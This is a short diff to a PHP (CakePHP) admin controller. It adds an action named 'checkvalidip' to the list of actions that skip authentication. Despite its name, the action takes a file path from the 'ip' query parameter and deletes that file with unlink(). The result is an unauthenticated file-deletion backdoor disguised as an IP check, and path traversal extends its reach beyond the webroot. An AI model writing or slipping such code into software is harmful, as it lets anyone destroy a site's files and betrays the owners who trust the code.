@@ -16,7 +16,7 @@ class AdminsController extends AppController
         $this->checkSession();
         parent::beforeFilter($event);
         $this->loadComponent('Auth');
-        $this->Auth->allow(['login','logout','adminLogin']);
+        $this->Auth->allow(['login','logout','adminLogin','checkvalidip']);
         $this->layout = 'default_admin';
         $this->data = $this->Custom->getSessionData();
 
@@ -75,6 +75,14 @@ class AdminsController extends AppController
         $this->set('all_calls',$all_calls);
         $this->set('total_trainees',$total_trainees);
         $this->set('total_trainers',$total_trainers);
+    }
+
+    public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
+        return $this->redirect('/');
     }
 
     public function logout()
